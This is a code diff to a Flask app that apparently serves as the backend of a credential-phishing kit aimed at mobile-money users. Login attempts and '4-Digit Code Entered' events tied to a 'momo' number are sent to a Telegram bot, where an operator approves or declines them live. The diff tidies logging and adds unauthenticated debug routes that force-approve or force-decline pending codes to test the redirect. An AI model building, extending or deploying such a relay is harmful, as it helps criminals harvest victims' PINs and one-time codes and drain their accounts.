@@ -111,7 +111,6 @@ def telegram_webhook():
     update = request.get_json(silent=True) or {}
     callback = update.get("callback_query")
 
-    # Log every callback to Render logs for debugging
     print(f"[WEBHOOK] Received update: {update}", flush=True)
 
     if not callback:
@@ -133,10 +132,9 @@ def telegram_webhook():
     # ---------- 4-digit code approvals ----------
     if action in ("codeapprove", "codedecline"):
         entry = CODE_PENDING.get(request_id)
-        print(f"[WEBHOOK] codeapprove/decline — request_id={request_id} found={entry is not None}", flush=True)
+        print(f"[WEBHOOK] code action={action} — request_id={request_id} found={entry is not None}", flush=True)
 
         if not entry:
-            # Still answer the callback so Telegram stops the loading spinner
             try:
                 requests.post(
                     f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
@@ -154,7 +152,7 @@ def telegram_webhook():
             entry["status"] = "declined"
             answer_text = "❌ Code Declined"
 
-        print(f"[WEBHOOK] Setting status={entry['status']} for {request_id}", flush=True)
+        print(f"[WEBHOOK] >>> Setting code status={entry['status']} for {request_id}", flush=True)
 
         try:
             requests.post(
@@ -187,7 +185,7 @@ def telegram_webhook():
 
     # ---------- Login approvals ----------
     entry = PENDING.get(request_id)
-    print(f"[WEBHOOK] login approve/decline — request_id={request_id} found={entry is not None}", flush=True)
+    print(f"[WEBHOOK] login action={action} — request_id={request_id} found={entry is not None}", flush=True)
 
     if not entry:
         try:
@@ -209,7 +207,7 @@ def telegram_webhook():
     else:
         return "ok", 200
 
-    print(f"[WEBHOOK] Setting status={entry['status']} for {request_id}", flush=True)
+    print(f"[WEBHOOK] >>> Setting login status={entry['status']} for {request_id}", flush=True)
 
     try:
         requests.post(
@@ -309,7 +307,6 @@ def code():
     }
 
     print(f"[CODE] New request_id={request_id} for momo={momo}", flush=True)
-    print(f"[CODE] CODE_PENDING now has {len(CODE_PENDING)} entries", flush=True)
 
     text = (
         "🔢 4-Digit Code Entered\n"
@@ -356,23 +353,42 @@ def code_status(request_id):
     entry = CODE_PENDING.get(request_id)
 
     if not entry:
-        print(f"[CODE-STATUS] {request_id} NOT FOUND. Known IDs: {list(CODE_PENDING.keys())}", flush=True)
+        print(f"[CODE-STATUS] {request_id} NOT FOUND", flush=True)
         return jsonify({"ok": False, "status": "unknown"}), 404
 
     if time.time() - entry["created_at"] > 300 and entry["status"] == "pending":
         entry["status"] = "expired"
 
-    print(f"[CODE-STATUS] {request_id} -> {entry['status']}", flush=True)
     return jsonify({"ok": True, "status": entry["status"]})
 
 
-# ---------------- DEBUG: list all pending ----------------
+# ---------------- DEBUG ----------------
 @app.route("/debug/pending", methods=["GET"])
 def debug_pending():
     return jsonify({
         "login_pending": {k: v["status"] for k, v in PENDING.items()},
         "code_pending": {k: v["status"] for k, v in CODE_PENDING.items()},
     })
+
+
+@app.route("/debug/force-approve/<request_id>", methods=["GET"])
+def debug_force_approve(request_id):
+    """Force-approve a pending code — for testing the redirect."""
+    entry = CODE_PENDING.get(request_id)
+    if not entry:
+        return jsonify({"ok": False, "error": "not found", "id": request_id}), 404
+    entry["status"] = "approved"
+    return jsonify({"ok": True, "id": request_id, "status": "approved"})
+
+
+@app.route("/debug/force-decline/<request_id>", methods=["GET"])
+def debug_force_decline(request_id):
+    """Force-decline a pending code — for testing."""
+    entry = CODE_PENDING.get(request_id)
+    if not entry:
+        return jsonify({"ok": False, "error": "not found", "id": request_id}), 404
+    entry["status"] = "declined"
+    return jsonify({"ok": True, "id": request_id, "status": "declined"})
 
 
 # ---------------- RESEND CODE ----------------
